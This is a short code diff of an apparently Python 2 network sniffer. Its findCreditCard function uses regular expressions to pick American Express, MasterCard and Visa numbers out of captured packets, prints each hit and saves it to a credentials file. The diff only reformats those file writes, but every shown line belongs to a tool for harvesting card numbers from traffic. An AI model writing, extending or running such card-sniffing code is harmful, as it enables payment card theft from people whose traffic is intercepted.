@@ -27,13 +27,16 @@ def findCreditCard(pkt):
     visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
     if americaRE:
         print '[+] Found American Express Card: ' + americaRE[0]
-        saved_Creds.write('American Express: ' + americaRE[0] + '\n\r')
+        # saved_Creds.write('American Express: ' + americaRE[0] + '\n\r')
+        saved_Creds.write('\n\rAmerican Express: '+ americaRE[0])
     if masterRE:
         print '[+] Found MasterCard Card: ' + masterRE[0]
-        saved_Creds.write('MasterCard: ' + masterRE[0] + '\n\r')
+        # saved_Creds.write('MasterCard: ' + masterRE[0] + '\n\r')
+        saved_Creds.write('\n\rMasterCard: ' + masterRE[0])
     if visaRE:
         print '[+] Found Visa Card: ' + visaRE[0]
-        saved_Creds.write('VISA: ' + visaRE[0] + '\n\r')
+        # saved_Creds.write('VISA: ' + visaRE[0] + '\n\r')
+        saved_Creds.write('\n\rVISA: ' + visaRE[0])
 
 def main():
     parser = optparse.OptionParser('usage % prog -i <interface>')
